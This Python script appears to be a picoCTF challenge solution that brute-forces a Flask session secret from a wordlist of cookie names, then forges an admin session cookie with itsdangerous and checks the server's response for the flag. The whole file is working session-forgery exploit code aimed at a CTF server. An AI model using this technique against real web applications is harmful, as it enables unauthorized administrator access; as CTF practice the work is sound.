
# Import Libraries
from bs4 import BeautifulSoup
import requests
from pathlib import Path
from itsdangerous import URLSafeTimedSerializer


def pre():
    pass
    # # Create wordlist
    # cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

    # with open(str(Path(__file__).parent/'wordlist.txt'), 'w') as F:
    #     for name in cookie_names:
    #         F.write(name + "\n")
    #     F.close()

# core part of exploit
def BF(URL):
    # 从服务器获取初始 Cookie
    session = requests.Session()
    response = session.get(URL)
    initial_cookie = session.cookies.get_dict().get('session')

    cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

    # 伪造会话数据
    session_data = {'very_auth': 'admin'}
    # 尝试每一个 secret_key
    for secret_key in cookie_names:
        # 创建一个序列化器
        serializer = URLSafeTimedSerializer(secret_key)
        
        # 生成伪造的会话 Cookie
        forged_cookie = serializer.dumps(session_data)
        
        # 设置伪造的 Cookie
        cookies = {'session': forged_cookie}
        
        # 发送请求
        response = requests.get(URL, cookies=cookies)
        
        # 检查响应内容
        if "flag" in response.text:
            print(f"成功破解！secret_key: {secret_key}")
            print(f"伪造的会话 Cookie: {forged_cookie}")
            break
    else:
        print("未能成功破解。")

# Send cookies to website
def result(url, response, token):
    cookies = dict(session=token)
    response = requests.get(url, cookies=cookies)
    soup = BeautifulSoup(response.text, "html.parser")

    # Retreive flag from page
    flag = soup.select("body > div.container > div.jumbotron > p:nth-child(2)")[0]
    return flag.text

def main():
    # # constants
    url = "http://mercury.picoctf.net:44693/"
    # session = requests.Session()
    # response = session.get(url)
    # cookie = session.cookies.get_dict().get('session')
    
    # pre()
    BF(URL=url)

if __name__ == "__main__":
    main()